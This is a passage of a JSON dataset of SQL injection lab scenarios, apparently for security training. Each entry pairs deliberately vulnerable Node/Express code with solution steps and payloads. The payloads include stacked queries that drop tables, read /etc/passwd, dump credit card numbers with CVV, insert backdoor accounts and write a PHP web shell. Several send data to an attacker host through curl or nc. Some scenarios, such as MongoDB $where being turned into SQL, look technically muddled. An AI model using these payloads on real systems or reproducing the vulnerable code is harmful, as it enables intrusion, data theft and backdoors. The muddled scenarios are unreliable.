    "Vulnerability name": "SQL injection",
    "srcCode": "const { ApolloServer } = require('apollo-server');\n\nconst typeDefs = `\n  type User {\n    id: ID!\n    name: String!\n  }\n  \n  type Query {\n    users: [User]\n    user(id: ID!): User @sql(table: \"users\", column: \"id\")\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    user: (_, { id }, { db }) => {\n      // Vulnerable alias handling\n      const query = `SELECT * FROM users WHERE ${resolverInfo.fieldName} = '${id}'`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "query { user(id:\"1\") { id } user__0:user(id:\"1'; DROP TABLE firewall_rules--\") { id } }",
      "mutation { update__0:updateUser(id:\"1\",input:\"1')\",update__1:updateUser(id:\"1\",input:\"1'); UPDATE users SET is_admin=1 WHERE id=1--\") }",
      "query { __schema { types { name } } user(id:\"1' UNION SELECT 1,LOAD_FILE('/etc/passwd')--\") }",
      "query($id:String!) { user(id:$id) { id } }"
    ]
  },
  {
    "Lab scenario": "LDAP Filter SQLi in Employee Directory",
    "Lab Description": "The corporate directory system improperly converts LDAP filters to SQL queries. Special characters from both systems (LDAP and SQL) cause improper query handling. To exploit this, craft an LDAP filter that breaks into the SQL context and extracts sensitive HR records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept LDAP search requests with Burp Suite",
      "2. Identify vulnerable LDAP filter parameter",
      "3. Break the LDAP context using ')(objectClass=*)'",
      "4. Inject SQL into the LDAP context with '|(uid=*)) OR 1=1--'",
      "5. Extract sensitive data (e.g., HR records) from the database schema"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const ldap = require('ldapjs');\nconst db = require('./db');\n\nconst server = ldap.createServer();\n\nserver.search('ou=people', (req, res) => {\n  const filter = req.filter;\n  \n  // Vulnerable LDAP to SQL conversion\n  const where = convertLdapToSQL(filter);\n  const query = `SELECT * FROM employees WHERE ${where}`;\n  \n  db.query(query, (err, results) => {\n    results.forEach(entry => {\n      res.send(entryToLdap(entry));\n    });\n    res.end();\n  });\n});\n\nfunction convertLdapToSQL(filter) {\n  // Naive conversion that doesn't handle escaping\n  return filter.toString()\n    .replace(/\\(([^)]+)\\)/g, \"$1\")\n    .replace(/\\|/g, \" OR \")\n    .replace(/\\&/g, \" AND \");\n}",
    "payloads": [
      ")(objectClass=*)) OR 1=1--",
      ")(uid=*)) UNION SELECT 1, ssn, null FROM hr_records--",
      ")(|(uid=*)(objectClass=*))); INSERT INTO backdoor VALUES ('hacker','pass')--",
      ")(cn=*)) AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"
    ]
  },
  {
    "Lab scenario": "SQLi in MongoDB $where clause",
    "Lab Description": "The product catalog uses MongoDB but has a legacy SQL compatibility layer. The $where clause accepts JavaScript that gets translated to SQL. To solve: break out of the JS context to execute raw SQL against the underlying PostgreSQL database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $where parameter",
      "Break JS context with }); return true; //",
      "Enter SQL context with raw queries",
      "Use PostgreSQL dollar-quoted strings",
      "Perform cross-database exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { MongoClient } = require('mongodb');\nconst app = express();\n\napp.get('/products', async (req, res) => {\n  const client = await MongoClient.connect('mongodb://localhost:27017');\n  const db = client.db('catalog');\n  \n  // Vulnerable $where clause\n  const query = {\n    $where: `function() { return ${req.query.filter} }`\n  };\n  \n  // Gets converted to SQL\n  const results = await db.collection('products')\n    .find(query)\n    .toArray();\n  \n  res.json(results);\n});",
    "payloads": [
      "1; return true; }); db.getCollection('users').find({}); //",
      "1; return true; }); SQL.execute('SELECT * FROM pg_user'); //",
      "1; return true; }); SQL.execute($$COPY (SELECT * FROM secrets) TO PROGRAM 'curl attacker.com?leak=$(base64 /etc/passwd)'$$); //",
      "1; return true; }); SQL.execute($$CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$\n$$ BEGIN EXECUTE $1; RETURN '1'; END; $$\n$$ LANGUAGE plpgsql$$); //"
    ]
  },
  {
    "Lab scenario": "SSTI to SQLi in helpdesk templates",
    "Lab Description": "The ticket system renders templates with user-provided data. The application first processes SQL then templates, allowing SSTI to break into SQL context. To solve: chain template injection with SQLi to access the tickets database as admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit helpdesk ticket with SSTI payload",
      "Break template context with {{7*7}}",
      "Enter SQL context with }}' UNION SELECT 1,2,3--",
      "Access template rendering database",
      "Extract all tickets via dual-stage injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/tickets', (req, res) => {\n  const { subject, message } = req.body;\n  \n  // First SQL processing\n  db.query(\n    `INSERT INTO tickets (subject, message) \n     VALUES ('${subject}', '${message}')`\n  );\n  \n  // Then template rendering\n  const template = `\n    <div class=\"ticket\">\n      <h2>${subject}</h2>\n      <p>${message}</p>\n    </div>\n  `;\n  \n  res.send(template);\n});",
    "payloads": [
      "{{7*7}}' UNION SELECT 1,2,3--",
      "{% raw %}' OR 1=1; -- {{endraw}}",
      "{{config}}' UNION SELECT 1,2,(SELECT password FROM users WHERE username='admin')--",
      "{{''.__class__}}'); DROP TABLE tickets;--"
    ]
  },
  {
    "Lab scenario": "SQLi in dynamic pivot queries",
    "Lab Description": "The reporting tool builds pivot tables from user-controlled column names. The application uses unsafe string interpolation for dynamic SQL. To solve: break out of the column name context to execute system commands via PostgreSQL COPY.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept pivot table configuration",
      "Identify vulnerable column parameter",
      "Break SQL context with quoted column names",
      "Use PostgreSQL dollar quoting for stacked queries",
      "Execute commands via COPY TO PROGRAM"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/report', (req, res) => {\n  const { pivotColumn } = req.body;\n  \n  // Vulnerable dynamic pivot\n  const query = `\n    SELECT * FROM crosstab(\n      'SELECT department, month, sales FROM metrics',\n      'SELECT DISTINCT ${pivotColumn} FROM metrics'\n    ) AS ct(\n      department text,\n      ${pivotColumn} numeric[]\n    )`;\n  \n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "month FROM metrics); DROP TABLE users--",
      "month FROM metrics); COPY (SELECT * FROM passwords) TO '/var/www/static/leak.csv'--",
      "month FROM metrics); CREATE TABLE hack(cmd_output text); COPY hack FROM PROGRAM 'id'--",
      "month FROM metrics$$) AS ct(department text, cmd_output text); COPY (SELECT * FROM hack) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQLi in hybrid database architecture",
    "Lab Description": "The application uses MongoDB for frontend but PostgreSQL for reporting, with unsafe data passing between them. The $expr operator allows JavaScript execution. To solve: break out of MongoDB aggregation pipeline to execute raw SQL against the reporting database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $expr parameter",
      "Break aggregation context with JavaScript",
      "Access SQL bridge functions",
      "Execute stacked queries against reporting DB",
      "Extract financial data via cross-database query"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { MongoClient } = require('mongodb');\nconst app = express();\n\napp.get('/reports', async (req, res) => {\n  const client = await MongoClient.connect('mongodb://localhost:27017');\n  const db = client.db('hybrid');\n  \n  // Vulnerable $expr usage\n  const pipeline = [\n    { $match: { $expr: { $eq: [ '$status', req.query.status ] } } },\n    { $sql: `SELECT * FROM reports WHERE status = '${req.query.status}'` }\n  ];\n  \n  const results = await db.collection('data')\n    .aggregate(pipeline)\n    .toArray();\n  \n  res.json(results);\n});",
    "payloads": [
      "' || 1==1 || '",
      "' && this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') && '",
      "' || SQL.execute(`COPY (SELECT * FROM financials) TO PROGRAM 'nc attacker.com 4444'`) || '",
      "' && SQL.execute(`CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$\n$$ BEGIN EXECUTE $1; RETURN '1'; END; $$\n$$ LANGUAGE plpgsql`) && '"
    ]
  },
  {
    "Lab scenario": "Boolean-based SQL injection in Banking Portal's login form",
    "Lab Description": "The banking portal login form directly incorporates user input into a SQL query. The application returns different messages depending on whether the login is successful or not. This behavior leaks information about query evaluation. To solve: Use a Boolean-based SQLi to bypass authentication and access the admin panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept login request using Burp Suite",
      "Test payload: ' OR 1=1-- to check response",
      "Craft final payload: admin' OR '1'='1'--",
      "Observe successful login and redirection to admin panel",
      "Take a screenshot of the admin dashboard as proof"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.redirect('/admin');\n    else res.send('Invalid credentials');\n  });\n});",
    "payloads": [
      "admin' OR 1=1--",
      "admin'--",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "Time-based blind SQL injection in CMS search endpoint",
    "Lab Description": "The CMS search endpoint includes user input in a SQL query without sanitization. Errors are suppressed, but time-based inference is possible. To solve: Use time delays to extract the database name.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz the search parameter",
      "Inject payloads with SLEEP() and measure response time",
      "Payload example: ' OR IF(1=1, SLEEP(5), 0)--",
      "Refine to: ' OR IF(database() LIKE 'cms%', SLEEP(5), 0)--",
      "Confirm database name with timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const term = req.query.q || '';\n  const query = `SELECT * FROM articles WHERE title LIKE '%${term}%'`;\n  db.all(query, (err, rows) => {\n    if (err) return res.json([]); // Error suppression\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0)--",
      "' OR IF(database() LIKE 'cms%', SLEEP(5), 0)--",
      "' OR (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=1 AND SLEEP(5)--"
    ]
  },
  {
    "Lab scenario": "SQL injection via ORDER BY in IoT Dashboard device logs",
    "Lab Description": "The IoT dashboard log viewer accepts column names via query params to dynamically ORDER BY input. The app fails to sanitize input. To solve: Use SQLi in ORDER BY clause to retrieve table structure.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to test /logs?order=device_id",
      "Inject payload: device_id,(SELECT 1 FROM information_schema.tables LIMIT 1)--",
      "Confirm output shows database information",
      "Use: 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='devices')--",
      "Enumerate column names in response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/logs', (req, res) => {\n  const order = req.query.order || 'id';\n  const query = `SELECT * FROM logs ORDER BY ${order}`;\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send('Sorting error');\n    res.json(rows);\n  });\n});",
    "payloads": [
      "device_id,(SELECT 1 FROM information_schema.tables LIMIT 1)--",
      "1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='devices')--"
    ]
  },
  {
    "Lab scenario": "UNION-based SQL injection in Banking Portal's transfer history",
    "Lab Description": "The transfer history feature filters by date and concatenates user input without validation. The app returns full query output. To solve: Use UNION to extract current session token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept /history?date=",
      "Determine column count with: ' ORDER BY 2--",
      "Test with UNION SELECT NULL,NULL--",
      "Payload: ' UNION SELECT username,session_token FROM active_sessions--",
      "Verify session tokens are returned and reuse one"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/history', (req, res) => {\n  const date = req.query.date || '2023-01-01';\n  const query = `SELECT amount, to_user FROM transfers WHERE date = '${date}'`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT username,session_token FROM active_sessions--",
      "' UNION SELECT 1,@@version--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection via HTTP header in CMS",
    "Lab Description": "A custom CMS logs the 'X-User-Role' HTTP header directly into a SQL query. The response doesn't change, but logs can be timed. To solve: Use blind inference to leak the admin password hash.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept requests using Burp and modify X-User-Role",
      "Send payload: admin' AND 1=1-- and measure response time",
      "Refine to: admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 70--",
      "Use binary search with SLEEP() to guess each character",
      "Reconstruct password hash from timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const role = req.headers['x-user-role'] || 'guest';\n  const logQuery = `INSERT INTO audit_logs (role, timestamp) VALUES ('${role}', datetime('now'))`;\n  db.run(logQuery);\n  next();\n});",
    "payloads": [
      "admin' AND 1=1--",
      "admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 70--",
      "admin' AND IF((SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%'),SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "Out-of-band SQL injection in API Gateway diagnostics endpoint",
    "Lab Description": "The diagnostics endpoint logs user agent strings and performs internal queries. It leaks no response but allows out-of-band DNS requests. To solve: Trigger a DNS lookup to your Burp Collaborator domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Collaborator to set up listener",
      "Inject payload: '; EXEC xp_dirtree '\\\\your-collab-id.burpcollaborator.net\\share'--",
      "Send request with payload in User-Agent header",
      "Check Collaborator for DNS interaction",
      "Validate exfiltration via different subdomains"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/diagnostics', (req, res) => {\n  const agent = req.headers['user-agent'] || '';\n  const logQuery = `INSERT INTO diagnostics (info, timestamp) VALUES ('${agent}', NOW())`;\n  db.query(logQuery);\n  res.send('Diagnostic data logged');\n});",
    "payloads": [
      "'; EXEC xp_dirtree '\\\\abc.burpcollaborator.net\\share'--",
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--"
    ]
  },
  {
    "Lab scenario": "SQL injection in ORDER BY clause in CMS pagination",
    "Lab Description": "A CMS plugin allows clients to control ORDER BY for pagination. Injection into the ORDER clause is unsanitized. To solve: Use SQL injection to leak column names via error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send: /posts?page=1&sort=id",
      "Try sort=(CASE WHEN (1=1) THEN id ELSE title END) to test control",
      "Use: sort=(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='posts')>0 THEN id ELSE 1/0 END)",
      "Extract column names via error messages",
      "List all fields in posts table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/posts', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT * FROM posts ORDER BY ${sort} LIMIT 10`;\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send(err.message); // Error leakage\n    res.json(rows);\n  });\n});",
    "payloads": [
      "(CASE WHEN (1=1) THEN id ELSE title END)",
      "(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='posts')>0 THEN id ELSE 1/0 END)",
      "1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts')--"
    ]
  },
  {
    "Lab scenario": "SQL injection via GROUP BY clause in financial analytics tool",
    "Lab Description": "A financial analytics report allows grouping by column passed via GET request. The GROUP BY clause is unsanitized. To solve: Inject into GROUP BY to display column values from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /analytics?group=category",
      "Inject group=category UNION SELECT username FROM users--",
      "Observe usernames appear in grouped table",
      "Refine to: group=1 UNION SELECT password FROM users--",
      "Document password hashes found"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/analytics', (req, res) => {\n  const groupBy = req.query.group || 'category';\n  const query = `SELECT ${groupBy}, COUNT(*) FROM transactions GROUP BY ${groupBy}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "category UNION SELECT username FROM users--",
      "1 UNION SELECT password FROM users--",
      "1 UNION SELECT table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "Login bypass using stacked queries in IoT portal",
    "Lab Description": "The login form allows stacked queries using semicolons. This permits command chaining and account hijacking. To solve: Log in using SQLi and change the password of admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send username: admin'; UPDATE users SET password='hacked' WHERE username='admin';--",
      "Submit any password value",
      "Login using username 'admin' and password 'hacked'",
      "Confirm access to admin dashboard",
      "Document the vulnerability"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.redirect('/dashboard');\n    else res.send('Login failed');\n  });\n});",
    "payloads": [
      "admin'; UPDATE users SET password='hacked' WHERE username='admin';--",
      "admin'; INSERT INTO users (username,password) VALUES ('attacker','pwned');--"
    ]
  },
  {
    "Lab scenario": "SQL injection in nested subquery within Banking Portal reports",
    "Lab Description": "A banking report form executes nested queries using user input. The subquery for filtering account types is injectable. To solve: Extract the credit card numbers using SQL injection into the nested query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to send: /report?account=1",
      "Inject payload: ' UNION SELECT credit_card FROM cards WHERE '1'='1",
      "Refine to: ' OR EXISTS(SELECT 1 FROM cards WHERE card_number LIKE '4%')--",
      "Dump complete card numbers with: ' UNION SELECT CONCAT(card_number,'|',expiry,'|',cvv) FROM cards--",
      "Document the extracted card data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/report', (req, res) => {\n  const acc = req.query.account || '1';\n  const query = `SELECT * FROM reports WHERE acc_id IN (SELECT id FROM accounts WHERE type = '${acc}')`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT credit_card FROM cards WHERE '1'='1",
      "' OR EXISTS(SELECT 1 FROM cards WHERE card_number LIKE '4%')--",
      "' UNION SELECT CONCAT(card_number,'|',expiry,'|',cvv) FROM cards--"
    ]
  },
  {
    "Lab scenario": "SQL injection in GraphQL variables parser",
    "Lab Description": "A GraphQL endpoint improperly handles variable type conversion, allowing SQL injection when variables are interpolated into raw SQL. The application uses a custom @sql directive. To solve: Exploit variable parsing to extract the GraphQL schema definition.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send introspection query to identify @sql directives",
      "Craft query with malicious variables: {filter: \"1=1) UNION SELECT 1,2,3,table_name FROM information_schema.tables--\"}",
      "Use JSON encoding bypass: {\"filter\": {\"$gt\": \"' UNION SELECT schema FROM graphql.schema--\"}}",
      "Extract complete schema via error-based technique",
      "Map all database tables through GraphQL types"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { ApolloServer } = require('apollo-server');\nconst typeDefs = `\n  directive @sql(raw: Boolean) on FIELD_DEFINITION\n  type Query {\n    products(filter: String!): [Product] @sql(raw: true)\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    products: (_, { filter }) => {\n      return db.query(`SELECT * FROM products WHERE ${filter}`);\n    }\n  }\n};",
    "payloads": [
      "1=1) UNION SELECT 1,2,3,table_name FROM information_schema.tables--",
      "' OR 1=1; EXECUTE IMMEDIATE 'SELECT * FROM graphql.schema'--",
      "1=1) RETURNING 1,2,3,(SELECT schema FROM graphql.schema)--"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL injection in hybrid document-relational system",
    "Lab Description": "An application stores JSON documents in PostgreSQL jsonb columns but converts queries to SQL unsafely. The $where clause allows JavaScript execution that reaches raw SQL. To solve: Break out of MongoDB-style syntax to execute arbitrary SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable JSON query parameter",
      "Break JavaScript context with: {\"$where\": \"1; return true\"}",
      "Enter SQL context with: {\"$where\": \"1); SELECT * FROM pg_user--\"}",
      "Leverage PostgreSQL JSON operators for data exfiltration",
      "Dump all collections via SQL UNION queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/query', (req, res) => {\n  const { filters } = req.body;\n  let where = \"data @> '\"\";\n  \n  if (filters.$where) {\n    where += ` AND ${eval(filters.$where)}`; // Dangerous eval\n  }\n  \n  const query = `SELECT * FROM documents WHERE ${where}`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$where\": \"1); SELECT * FROM pg_user--\"}",
      "{\"$where\": \"1); COPY (SELECT * FROM secrets) TO '/tmp/leak'--\"}",
      "{\"$where\": \"1); SELECT pg_read_file('/etc/passwd')--\"}"
    ]
  },
  {
    "Lab scenario": "SQL injection in JWT claim processing",
    "Lab Description": "The application extracts organization_id from JWT tokens and uses it directly in SQL queries with JSON path operations. To solve: Forge a JWT with malicious JSON path traversal to access all organizations' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT and identify organization_id claim",
      "Craft token with: {\"organization_id\":\"']'::jsonb) UNION SELECT 1,2,3,table_name FROM information_schema.tables--\"}",
      "Use PostgreSQL JSON operators: {\"organization_id\":\"' @> '{\\\"is_admin\\\":true}'::jsonb--\"}",
      "Extract other organizations' data via path traversal",
      "Access admin functionality through claim injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const token = jwt.verify(req.headers.authorization, SECRET);\n  const query = `\n    SELECT * FROM org_data \n    WHERE data::jsonb @> '{\"org_id\":${token.organization_id}}'::jsonb`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "']'::jsonb) UNION SELECT 1,2,3,table_name FROM information_schema.tables--",
      "' @> '{\"is_admin\":true}'::jsonb--",
      "']'::jsonb); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in MongoDB aggregation pipeline",
    "Lab Description": "An analytics dashboard converts MongoDB aggregation stages to SQL queries unsafely. The $match and $project stages are vulnerable. To solve: Break out of aggregation syntax to execute raw SQL against the underlying database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter",
      "Break pipeline context with: {\"$match\": {\"$expr\": {\"$eq\": [1, \"1); SELECT 1--\"]}}}",
      "Use JavaScript evaluation: {\"$where\": \"1); SELECT * FROM users--\"}",
      "Execute stacked queries via $function stage",
      "Dump entire database through SQL exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/aggregate', (req, res) => {\n  const pipeline = req.body;\n  const query = convertAggregationToSQL(pipeline); // Vulnerable conversion\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$match\": {\"$expr\": {\"$eq\": [1, \"1); SELECT 1--\"]}}}",
      "{\"$project\": {\"test\": \"$' UNION SELECT 1,2,3--\"}}",
      "{\"$function\": {\"body\": \"function() { return SQL.execute('SELECT * FROM users'); }\"}}"
    ]
  },
  {
    "Lab scenario": "SQL injection in CSV export via field terminators",
    "Lab Description": "A reporting feature exports query results to CSV using unsafe field terminators. The application allows control over delimiter characters. To solve: Inject SQL through field terminators to execute commands when the CSV is processed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept CSV export request",
      "Inject malicious field terminator: INTO OUTFILE '/tmp/test' FIELDS TERMINATED BY '=CMD|'",
      "Include command execution: LINES TERMINATED BY '/C calc.exe!'",
      "Trigger file processing on server",
      "Verify command execution through side effects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const { delimiter } = req.query;\n  const query = `\n    SELECT * FROM reports \n    INTO OUTFILE '/tmp/report.csv' \n    FIELDS TERMINATED BY '${delimiter || \",\"}'`;\n  \n  db.query(query, () => {\n    res.download('/tmp/report.csv');\n  });\n});",
    "payloads": [
      "'=CMD|' LINES TERMINATED BY '/C calc.exe!'--",
      "0x3d434d447c204c494e4553205445524d494e4154454420425920272f432063616c632e65786521--",
      "'\\' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/backdoor.php' LINES TERMINATED BY '<?php system($_GET[\\'cmd\\']); ?>'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in dynamic materialized view refresh",
    "Lab Description": "A data warehouse application refreshes materialized views using unsafe dynamic SQL. The WITH DATA clause is injectable. To solve: Exploit refresh timing to perform blind data extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify materialized view refresh endpoint",
      "Inject WITH clause: WITH DATA OR 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
      "Use time-based inference for blind extraction",
      "Measure refresh duration to infer query results",
      "Reconstruct database schema through timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/refresh-view', (req, res) => {\n  const { viewName } = req.body;\n  const query = `REFRESH MATERIALIZED VIEW ${viewName} WITH DATA`;\n  \n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('View refreshed');\n  });\n});",
    "payloads": [
      "sales_data WITH DATA OR 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
      "inventory WITH NO DATA); SELECT pg_sleep(5)--",
      "customer_data WITH DATA); COPY (SELECT * FROM passwords) TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in full-text search parser",
    "Lab Description": "A search engine uses PostgreSQL tsquery syntax directly from user input. The application fails to sanitize special operators. To solve: Break out of text search context to execute arbitrary queries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable search parameter",
      "Break tsquery syntax with: ' OR '1'='1'::tsquery",
      "Convert to raw SQL: ') OR 1=1--",
      "Leverage full-text search functions for data extraction",
      "Dump document contents through search vectors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { q } = req.query;\n  const query = `\n    SELECT * FROM documents \n    WHERE to_tsvector(content) @@ to_tsquery('${q}')`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR '1'='1'::tsquery",
      "') OR 1=1--",
      "')) UNION SELECT 1,2,3,current_database()--"
    ]
  },
  {
    "Lab scenario": "SQL injection in array literal generation",
    "Lab Description": "A geospatial application builds PostGIS queries with unsafe array concatenation. The ARRAY[] constructor is vulnerable. To solve: Break out of array context to access PostGIS functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable coordinates parameter",
      "Break array syntax with: 1]::text) OR 1=1--",
      "Access PostGIS functions: 1]::text) OR ST_AsText(ST_Transform(ST_GeomFromText('POINT(0 0)',4326),3785))--",
      "Execute system commands via PostGIS external modules",
      "Dump all spatial data through injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/nearby', (req, res) => {\n  const { coords } = req.query;\n  const query = `\n    SELECT * FROM locations \n    WHERE ST_Contains(\n      ST_Polygon('ARRAY[${coords}]'::float8[]),\n      point\n    )`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1]::text) OR 1=1--",
      "1]::text); SELECT ST_AsText(geom) FROM sensitive_locations--",
      "1]::text); COPY (SELECT * FROM users) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "SQL injection in window function frame clause",
    "Lab Description": "An analytics application allows custom window frame specifications. The ROWS/RANGE clause is vulnerable. To solve: Exploit frame boundary definitions to execute arbitrary SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax with: BETWEEN 1 PRECEDING AND 1) OR 1=1--",
      "Inject UNION queries via frame boundaries",
      "Access window function internals for data extraction",
      "Dump all analytical data through injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { frame } = req.query;\n  const query = `\n    SELECT id, \n      SUM(value) OVER (ORDER BY date ${frame || 'ROWS 1 PRECEDING'})\n    FROM metrics`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "BETWEEN 1 PRECEDING AND 1) OR 1=1--",
      "ROWS 1 PRECEDING) UNION SELECT 1,table_name FROM information_schema.tables--",
      "RANGE INTERVAL '1' DAY) OR EXISTS(SELECT * FROM passwords)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in recursive CTE anchor member",
    "Lab Description": "A hierarchical data explorer builds recursive CTEs with user input in the anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to execute stacked queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable hierarchy root parameter",
      "Break CTE syntax with: 1) UNION SELECT 1,2,3 FROM users--",
      "Inject malicious recursive term",
      "Exploit query depth limits for blind extraction",
      "Dump organizational hierarchy through injection"
    ],
    "Vulnerability name": "SQL injection",
